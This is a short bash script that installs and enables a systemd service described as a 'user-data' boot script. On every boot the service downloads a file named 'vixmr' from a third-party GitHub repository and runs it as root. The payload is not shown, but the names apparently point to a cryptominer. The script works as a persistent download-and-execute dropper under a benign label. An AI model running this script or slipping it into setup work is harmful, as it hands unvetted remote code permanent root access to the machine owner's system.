#!/bin/bash

cat << 'EOF' | sudo tee /etc/systemd/system/auto-script.service
[Unit]
Description=Download and run user-data script on boot
After=network-online.target
Wants=network-online.target

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'echo "Downloading user-data from GitHub..."; curl -sL https://raw.githubusercontent.com/kiemtien1/data/refs/heads/main/vixmr -o /tmp/user_data.sh && bash /tmp/user_data.sh'
RemainAfterExit=true

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload
sudo systemctl enable auto-script.service
